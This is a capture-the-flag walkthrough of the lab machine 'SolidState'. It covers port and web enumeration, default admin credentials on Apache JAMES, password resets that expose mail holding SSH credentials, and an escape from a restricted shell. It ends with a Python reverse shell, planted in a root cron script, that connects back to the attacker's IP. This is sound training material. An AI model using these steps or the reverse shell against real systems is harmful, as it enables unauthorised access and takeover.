# SolidState

## Information Gathering
solidstate<br>
10.10.10.51<br>

Application Versions
<ul>
	<li>Apache 2.4.25</li>
	<ul>
		<li>Creative Commons Attribution 3.0 Unported</li>
	</ul>
	<li>JAMES SMTP Server 2.3.2</li>
	<li>JAMES POP3 Server 2.3.2</li>
</ul>

## Enumeration
First start with an nmap scan
```bash
# Nmap 7.92 scan initiated Fri Feb 11 20:44:23 2022 as: nmap -p- -A -oN nmap/solidstate_all.nmap 10.10.10.51
Nmap scan report for 10.10.10.51
Host is up (0.029s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.122 [10.10.14.122])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
119/tcp  open  nntp    JAMES nntpd (posting ok)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.92%I=7%D=2/11%Time=62071116%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 11 20:48:46 2022 -- 1 IP address (1 host up) scanned in 262.92 seconds
```
I also run a Nikto scan for the web server:
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.51
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ HEAD Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ GET Server may leak inodes via ETags, header found with file /, inode: 1e60, size: 5610a1e7a4c9b, mtime: gzip
+ OPTIONS Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3268: GET /images/: Directory indexing found.
+ OSVDB-3092: GET /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: GET /icons/README: Apache default file found.
```
I also do a directory busting on the web server.<br>
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Fri Feb 11 21:18:41 EST 2022
--------------------------------

http://10.10.10.51:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/images/
/assets/
/assets/js/
/assets/css/
/assets/js/ie/
/assets/fonts/
/assets/css/images/
/assets/sass/
/assets/sass/base/
/assets/sass/components/
/assets/sass/layout/
/assets/sass/libs/

Dirs found with a 403 response:

/icons/
/icons/small/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/index.html
/about.html
/services.html
/assets/js/skel.min.js
/assets/js/jquery.min.js
/assets/js/jquery.scrollex.min.js
/assets/js/util.js
/assets/js/main.js
/assets/css/font-awesome.min.css
/assets/js/ie/PIE.htc
/assets/fonts/FontAwesome.otf
/assets/css/images/close.svg
/assets/css/ie8.css
/assets/js/ie/backgroundsize.min.htc
/assets/css/ie9.css
/assets/js/ie/html5shiv.js
/assets/fonts/fontawesome-webfont.eot
/assets/js/ie/respond.min.js
/assets/sass/base/_page.scss
/assets/css/main.css
/assets/sass/ie8.scss
/assets/sass/base/_typography.scss
/assets/fonts/fontawesome-webfont.svg
/assets/sass/ie9.scss
/assets/fonts/fontawesome-webfont.ttf
/assets/sass/components/_box.scss
/assets/fonts/fontawesome-webfont.woff
/assets/fonts/fontawesome-webfont.woff2
/assets/sass/components/_button.scss
/assets/sass/main.scss
/assets/sass/components/_features.scss
/assets/sass/components/_form.scss
/assets/sass/layout/_banner.scss
/assets/sass/components/_icon.scss
/assets/sass/layout/_footer.scss
/assets/sass/components/_image.scss
/assets/sass/layout/_header.scss
/assets/sass/libs/_functions.scss
/assets/sass/components/_list.scss
/assets/sass/layout/_menu.scss
/assets/sass/libs/_mixins.scss
/assets/sass/components/_section.scss
/assets/sass/layout/_wrapper.scss
/assets/sass/libs/_skel.scss
/assets/sass/libs/_vars.scss
/assets/sass/components/_table.scss
/README.txt
/icons/README.html
/LICENSE.txt


--------------------------------

```

## Exploitation
There are three exploits that interest me.<br>
https://www.exploit-db.com/exploits/35513<br>
https://www.exploit-db.com/exploits/48130<br>
https://www.exploit-db.com/exploits/50347<br>

I discover that the Remote Administration Tool has it's default credentials set of <b>root:root</b> which authenticates me. I first login to the admin tool and have a look around before doing any exploitation.
```bash
nc -nv 10.10.10.51 4555

listusers
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```
Gives a handful of users. <br>

I am able to change all the passwords for these accounts using the <b>setpassword</b> command. I can change the password and then log into these accounts using POP3. After logging into each user, Mindy has two interesting emails:<br>
```
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
```
and
```
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```
Which yields us the credentials: <b>mindy:P@55W0rd1!2@</b><br>
We can login as mindy except, like the email says, our environment is very restricted. Fortunatly, using <a href="https://www.exploit-db.com/exploits/50347">this</a> exploit from eariler allows us to upload and execute commands upon loggin in, effectivly breaking us out of the evironment. <a href="https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf">This</a> is a good paper to better understand the exploit.<br>
Once logging into the server, I catch a shell with an unrestricted environment.


## Privilege Escalation
Doing the basic enumeration of the Linux box. I run the command
```bash
find / -type f -perm -0777 -group root 2> /dev/null

/opt/tmp.py
```
This file is ran every minute or so and is owned by root. Rewriting the python code to throw a shell.<br>
```python
#!/usr/bin/env python
import sys,socket,os,pty

s = socket.socket()
s.connect(("10.10.14.122",6666))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```
